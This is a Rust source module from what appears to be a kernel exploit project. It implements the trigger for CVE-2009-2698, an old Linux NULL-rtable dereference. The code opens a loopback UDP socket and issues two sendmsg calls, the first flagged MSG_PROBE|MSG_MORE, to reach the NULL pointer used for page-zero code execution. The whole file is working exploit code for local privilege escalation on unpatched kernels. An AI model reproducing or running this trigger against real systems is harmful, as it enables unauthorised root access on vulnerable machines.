//! CVE-2009-2698: the NULL `struct rtable` page-zero ELF route.
//!
//! The trigger is the same loopback UDP `socket` plus two `sendmsg` calls as
//! the earlier C implementation.  `MSG_PROBE|MSG_MORE` on the first makes
//! `ip_append_data()` dereference the NULL rtable; the second reaches
//! `rt->u.dst.output` at 0x74.
//!
//! The raw syscalls are in `raw`; this module only sequences them.

use crate::raw;
use crate::sys::{MSG_MORE, MSG_PROBE};

pub(crate) fn trigger() -> isize {
    let s = raw::socket_udp();
    if s < 0 {
        return s;
    }
    let r1 = raw::sendmsg_udp(s as usize, 0x1600, 0x0100_007f, MSG_MORE | MSG_PROBE);
    let r2 = raw::sendmsg_udp(s as usize, 0x1600, 0x0100_007f, 0);
    raw::close(s as usize);
    if r1 < 0 {
        r1
    } else {
        r2
    }
}
